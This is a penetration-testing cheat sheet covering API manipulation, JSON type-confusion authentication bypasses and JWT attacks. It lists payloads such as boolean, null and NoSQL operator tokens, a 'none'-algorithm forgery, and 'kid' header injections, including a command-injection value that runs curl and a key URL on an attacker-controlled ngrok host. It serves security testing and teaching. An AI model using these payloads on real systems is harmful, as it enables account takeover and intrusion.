# 3. API & Session Security

## API Manipulation Techniques

- **Version rollback:** `api/v3/login` → `api/v1/login` (older versions often have weaker validation).
- Check for alternative endpoints serving other clients: `/api/mobile/login/` vs `/api/v3/login/`.
- Try every HTTP method against an endpoint: `GET`/`POST`/`PUT`/`DELETE`.
- Facing a GUID/UUID? Try a small numeric ID instead: `GET /api/user/6b95d962df38` → `GET /api/user/1`.
- **Wrap the ID in an array:** `{"id":111}` → `{"id":[111]}`.
- **Wrap the ID in an object:** `{"id":111}` → `{"id":{"id":111}}`.
- **Wildcard instead of an ID:** `/api/users/1` → `/api/users/*`, `/api/users/%`, `/api/users/_`, or `/api/users/.`
- Change `Content-Type` to `application/xml` and see if the app parses it anyway.
- Swap content types outright:
  - `x-www-form-urlencoded` → `user=1`
  - `application/json` → `{"user":1}`
  - `application/xml` → `<user>1</user>`
- For GraphQL APIs: start with an introspection query to map the full schema.

## JSON Type Confusion & Type Juggling

### Root Cause

JSON type confusion (type juggling) happens when a backend accepts JSON input without strict type validation. The app usually assumes a parameter is a `String` (a token, an OTP code), but behaves unpredictably when it instead receives a `Boolean`, `Null`, `Array`, or `Object`.

Three programming root causes make this dangerous:

| Cause | Explanation |
|---|---|
| **Loose comparison** | Using `==` instead of `===` (PHP, JavaScript). In PHP, `"any_string" == true` evaluates to `true`. |
| **No schema validation** | No JSON Schema enforcing the expected type per field before it hits business logic. |
| **Unsafe DB queries (ORM / NoSQL)** | Sending booleans or objects changes a query's behavior and can cause it to return the first matching record automatically. |

### Payload Behavior

**`true`** — targets loose comparison bypasses:

```php
if ($user_input_token == $db_stored_token) { // loose comparison
    // password reset "succeeds"
}
```

Sending `{"token": true}` turns the check into `true == "a8f9c..."`, which PHP evaluates as `true` — bypassing authentication.

**`false`** — targets functions that return `false` on failure/not-found:

```php
$db_token = findTokenInDB($user_input); // returns false if invalid/missing
if ($db_token == $user_input) {
    // if user_input is false, (false == false) evaluates to TRUE
}
```

**`null`** — targets records stored with a default `NULL` value. If a user never requested a reset, their `reset_token` column may be `NULL`. Sending `{"token": null}` can translate into:

```sql
SELECT * FROM users WHERE reset_token IS NULL LIMIT 1;
```

This can silently reset a random account's password (typically the first row in the table) and return that account's data.

### Payload Reference

| Payload type | JSON body | Target mechanism |
|---|---|---|
| Boolean True | `{"token": true}` | Bypass loose string comparison, force the condition to succeed |
| Boolean False | `{"token": false}` | Collide with functions that return `false` on failure |
| Null | `{"token": null}` | Target undefined fields / null-comparison logic |
| Numeric | `{"token": 0}` / `{"token": 1}` | Bypass checks in languages that treat `0` as falsy, or break integer comparisons |
| Empty Array | `{"token": []}` | Break ORM queries or bypass length checks |
| Array of values | `{"token": [true, "valid"]}` | Exploit systems that take the first array element and skip further validation |
| NoSQL Object | `{"token": {"$ne": ""}}` | MongoDB operator injection — matches any value not equal to an empty string |

### Where to Look

High-value target endpoints:

- Password reset (`PUT /api/v1/reset-password`)
- OTP / 2FA verification (`POST /api/v2fa/verify`)
- Account activation / email verification (`POST /api/activate`)
- Coupon/discount application (`POST /api/coupons/apply`)

### Methodology

1. **Capture the request** via Burp Suite — confirm `Content-Type: application/json`.
2. **Test basic type swaps:** replace the string value with `true`, then `false`, then `null`, then `0`.
3. **Test structural types:** replace the value with `[]`, `{}`, or a NoSQL operator like `{"$gt": ""}`.
4. **Read the full response, not just the status code:** compare response body content, response time, and whether unexpected user data was returned (leak of another account's data is often the real signal, not the status code).

### General "Unexpected Data Types" Checklist

Beyond auth-specific tokens, try this against any JSON field the app processes:

```json
{"username": "ash"}
{"username": true}
{"username": false}
{"username": null}
{"username": 1}
{"username": ["ash", true]}
```

---

## Sessions & JWT Misconfiguration

- **Signature not checked?** → modify the body freely.
- **Signature only checked if present?** → modify the body and delete the signature entirely.
- **Weak signing secret?** → brute-force it offline.
- **`none` algorithm attack** → change `alg` to `None`/`none`/`nONE`/`NONE`/`none` and drop the signature.
- **RS256 → HS256 downgrade:** if the app uses RS256, find the public key via recon, then re-sign a forged token with HS256 using that public key as the HMAC secret.
- **Vulnerable `kid` (Key ID) header:** the `kid` hints which key was used to verify the JWS. If the app fetches or reads that key path dynamically, this becomes a serious injection point:

```bash
# 1. Point kid at a URL/key you control
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
# "kid":"http://localhost/key.pem"  -->  "kid":"http://xyz.ngrok.io/jwtRS256.key"

# 2. Try publicly accessible files already on the server to verify the token
# "kid":"app/secret.pem"  -->  "kid":"../../public/main.css"

# 3. Command injection via kid
# "kid":"app/secret.pem && curl http://bing.com &"

# 4. SQL injection via kid
# "kid":"hello UNION SELECT 'key';--"
```
